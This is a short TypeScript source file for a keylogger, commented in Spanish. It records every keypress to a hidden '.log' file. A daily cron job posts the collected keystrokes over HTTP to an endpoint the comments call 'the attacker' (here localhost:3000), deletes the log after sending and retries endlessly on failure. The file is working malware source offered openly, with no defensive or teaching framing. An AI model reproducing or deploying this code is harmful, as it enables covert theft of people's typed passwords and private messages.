import cron from 'node-cron'
import fs from 'fs'
import axios from 'axios'
import keylogger from 'keylogger.js'

/**
 * Simple Keylogger
 */
class Keylogger {
    #logPath = '.log'

    constructor() {
        this.#startKeylogger()
        this.#startCrontJob()
    }

    /**
     * Iniciamos la escucha de eventos del keylogger
     */
    #startKeylogger() {
        keylogger.start((key: string, isKeyUp: boolean, keyCode: number) => {
            this.#appendDataToTXTFile({
                key: key,
                isKeyUp: isKeyUp,
                keyCode: keyCode,
            })
        })
    }

    /**
     * recibimos un caracter y lo concatenamos con los demas
     * datos pulsados por teclado en un archivo log
     * si este archivo no existe lo crea
     * @param data
     */
    #appendDataToTXTFile(data: any) {
        if (data.isKeyUp == false) {
            fs.appendFileSync(this.#logPath, data.key + '\n')
        }
    }

    /**
     * Creamos una tarea que envia los datos recopilados al atacante
     * todos los dias a las 12 de la noche
     */
    #startCrontJob() {
        cron.schedule('0 12 * * *', () => {
            this.#sendRequest()
        })
    }

    /**
     * Enviamos una solicitud http
     * con los datos al atacante
     * con esto cumplido borramos el archivo log
     */
    #sendRequest() {
        axios
            .post('localhost:3000', {
                data: fs.readFileSync(this.#logPath).toString(),
            })
            .then(() => {
                fs.unlinkSync(this.#logPath)
            })
            .catch(() => {
                this.#sendRequest()
            })
    }
}

new Keylogger()
